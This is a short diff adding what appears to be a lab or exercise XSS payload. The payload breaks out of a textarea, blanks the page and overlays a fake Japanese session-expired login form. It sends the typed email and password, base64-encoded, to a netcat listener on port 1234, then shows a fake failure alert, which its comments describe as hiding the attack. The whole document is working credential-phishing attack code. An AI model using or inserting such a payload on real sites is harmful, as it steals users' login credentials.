@@ -1,0 +1,30 @@
+</textarea>
+<script>
+  // 1. 画面を真っ白にする
+  document.body.innerHTML = "";
+
+  // 2. 本物そっくりの偽フォームHTMLを作る
+  const fakeHTML = `
+    <div style="z-index:9999; position:fixed; top:0; left:0; width:100%; height:100%; background:white; padding:50px; text-align:center;">
+      <h2>セキュリティ確認</h2>
+      <p>セッションが切れました。再ログインしてください。</p>
+      <input type="text" id="fake_user" placeholder="Email" style="padding:10px; margin:5px;"><br>
+      <input type="password" id="fake_pass" placeholder="Password" style="padding:10px; margin:5px;"><br>
+      <button id="fake_submit" style="padding:10px 20px;">Login</button>
+    </div>
+  `;
+  document.body.innerHTML = fakeHTML;
+
+  // 3. キーロガー/データ送信の仕組み (ncへfetch)
+  document.getElementById('fake_submit').addEventListener('click', () => {
+    const u = document.getElementById('fake_user').value;
+    const p = document.getElementById('fake_pass').value;
+    
+    // データをパッキングして自分の nc (Port 1234) へ送信！
+    fetch('http://127.0.0.1:1234/?creds=' + btoa(u + ':' + p));
+    
+    // 事後の隠蔽（リロードして地雷を消す）
+    alert("ログインに失敗しました。再試行してください。");
+    //location.reload();
+  });
+</script>
